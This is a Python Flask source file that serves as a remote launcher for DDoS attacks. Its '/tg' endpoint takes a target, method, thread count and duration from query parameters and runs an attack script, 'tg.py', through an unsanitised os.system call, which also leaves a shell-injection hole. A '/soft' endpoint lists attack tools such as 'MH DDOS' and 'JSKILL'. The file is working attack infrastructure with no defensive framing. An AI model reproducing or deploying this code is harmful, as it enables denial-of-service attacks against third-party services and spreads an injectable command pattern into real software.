from flask import Flask, request, jsonify
import os, threading
from dataclasses import dataclass
from typing import Optional

app = Flask(__name__)


@dataclass
class DDOSOptions:
    url: str
    port: Optional[int] = None
    method: Optional[str] = None
    thread: Optional[int] = None
    time: Optional[int] = None


@app.route('/cheak')
def check():
    return 'valid'


def start_tg(thread: int, time: int, target: str, method: str, ):
    os.system(f'python3.9 tg.py {thread} {time} {target} {method}')


@app.route('/tg', methods=['GET'])
def tg():
    try:
        options = DDOSOptions(thread=int(request.args['thread']), time=int(request.args['time']),
                              url=request.args['target'], method=request.args['method'])
    except:
        return "no valid request"
    t = threading.Thread(target=start_tg, args=(options.thread, options.time, options.url, options.method))
    t.start()
    return 'start'


@app.route("/soft")
def soft():
    return {"/start": "BASTERRZ", "/tor": "MH DDOS", "/tg": "TG DDOS", "/br": "BROWSER", "/js": "JSKILL",
            "/bro2": "BROWSERv2", }


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8000, debug=False)
